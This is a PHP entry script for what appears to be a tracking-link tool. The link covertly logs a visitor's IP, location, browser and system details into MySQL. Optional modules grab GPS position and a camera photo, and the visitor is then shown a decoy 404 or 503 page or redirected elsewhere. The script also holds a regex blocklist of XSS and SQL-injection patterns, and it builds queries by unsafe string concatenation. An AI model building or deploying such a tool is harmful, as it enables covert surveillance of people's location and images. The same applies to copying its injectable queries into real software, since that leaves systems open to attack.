<?php
error_reporting(0);
// 获取Key
$key = $_GET['key'];

//防xss mysql等注入
$checkdata = $key;
function clean($data){
    // Fix &entity＼n;
    $data=str_replace(array('&','<','>'),array('&amp;','&lt;','&gt;'),$data);
    $data=preg_replace('/(&#*＼w+)[＼x00-＼x20]+;/u','$1;',$data);
    $data=preg_replace('/(&#x*[0-9A-F]+);*/iu','$1;',$data);
    $data=html_entity_decode($data,ENT_COMPAT,'UTF-8');
    // Remove any attribute starting with "on" or xmlns
    $data=preg_replace('#(<[^>]+?[＼x00-＼x20"＼'])(?:on|xmlns)[^>]*+>#iu','$1>',$data);
    // Remove javascript: and vbscript: protocols
    $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=[＼x00-＼x20]*([`＼'"]*)[＼x00-＼x20]*j[＼x00-＼x20]*a[＼x00-＼x20]*v[＼x00-＼x20]*a[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2nojavascript...',$data);
    $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'"]*)[＼x00-＼x20]*v[＼x00-＼x20]*b[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2novbscript...',$data);
    $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'"]*)[＼x00-＼x20]*-moz-binding[＼x00-＼x20]*:#u','$1=$2nomozbinding...',$data);
    // Only works in IE: <span style="width: expression(alert('Ping!'));"></span>
    $data=preg_replace('#(<[^>]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"]*.*?expression[＼x00-＼x20]*＼([^>]*+>#i','$1>',$data);
    $data=preg_replace('#(<[^>]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"]*.*?behaviour[＼x00-＼x20]*＼([^>]*+>#i','$1>',$data);
    $data=preg_replace('#(<[^>]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"]*.*?s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:*[^>]*+>#iu','$1>',$data);
    // Remove namespaced elements (we do not need them)
    $data=preg_replace('#</*＼w+:＼w[^>]*+>#i','',$data);
    do{// Remove really unwanted tags
    $old_data=$data;
    $data=preg_replace('#</*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^>]*+>#i','',$data);
    }while($old_data!==$data);
    //remove javascript tag
    $data=preg_replace("/<script[^>]*?>.*?<\/script>/si",' ',$data);
    $data=preg_replace('/select|insert|update|delete|\'|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i','',$data);
    // we are done...
    return $data;
}
if(clean($checkdata) != $checkdata){
    include_once(dirname(__FILE__)."/modules/pages/404.php");
    exit();
}






// 获取数据库信息
include_once(dirname(__FILE__)."/modules/mySQL/dbconfig.php");  // $db_host/port/name/user/password
// 读取启用功能
$conn = new mysqli($db_host.":".$db_port, $db_user, $db_password, $db_name);
$sql = "SELECT * FROM tanzhen_web WHERE keyvalue='$key'";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
    $gps_function = $row['gps_function'];
    $ip_function = $row['ip_function'];
    $camera_function = $row['camera_function'];
    $browser_function = $row['browser_function'];
    $nextUrl = $row['url'];
} else {
    // 没有找到key就返回404 page
    include_once(dirname(__FILE__)."/modules/pages/404.php");
    $conn->close();
    exit();
}
$conn->close();
// 1. 获取IP
if($ip_function){
    include_once(dirname(__FILE__)."/modules/getInformation/get_ip.php");   //$ip $latitude $longitude $ip_location
}
// 2. 获取浏览器信息
if($browser_function){
    include_once(dirname(__FILE__)."/modules/getInformation/brower_information.php"); //$agent $browser $browser_language
    include_once(dirname(__FILE__)."/modules/getInformation/system.php"); //$system
}
// 由于 GPS 信息的特殊性 需要提前将(1) (2) 写入数据库
$time = explode(" ", microtime());
$time = ($time [1] + $time [0]) * 1000;
$time = round($time) . '';
$conn = new mysqli($db_host.":".$db_port, $db_user, $db_password, $db_name);
$sql = "INSERT INTO `tanzhen_information` (`id`, `keyvalue`, `timestamp`, `ip`, `ipjing`, `ipwei`, `gpsaddress`, `gpsjing`, `gpswei`, `cameraphoto`, `language`, `type`, `UA`, `system`, `ipaddress`) VALUES (NULL, '$key', '$time', '$ip', '$longitude', '$latitude', NULL, NULL, NULL, NULL, '$browser_language', '$browser', '$agent', '$system', '$ip_location');";
$conn->query($sql);
$conn->close();
// 3. 获取GPS信息
if($gps_function){
    include_once(dirname(__FILE__)."/modules/getInformation/gps.php"); 
}
// 4. 获取摄像头信息
if($camera_function){
    include_once(dirname(__FILE__)."/modules/getInformation/camera.php");
}

//跳转到相应页面
switch($nextUrl){
    case '404'://404页面
    include(dirname(__FILE__)."/modules/pages/404.php");
    break;
    case '503'://503页面
    include(dirname(__FILE__)."/modules/pages/503.php");
    break;
    case 'baidu'://百度
    $customDirectUrl = "https://www.baidu.com";
    break;
    default://自定义页面
    $customDirectUrl = $nextUrl;
    break;
}
if($customDirectUrl != NULL){
    echo '
    <script>
        window.location.href="'.$customDirectUrl.'"
    </script>
    ';
}

exit();
?>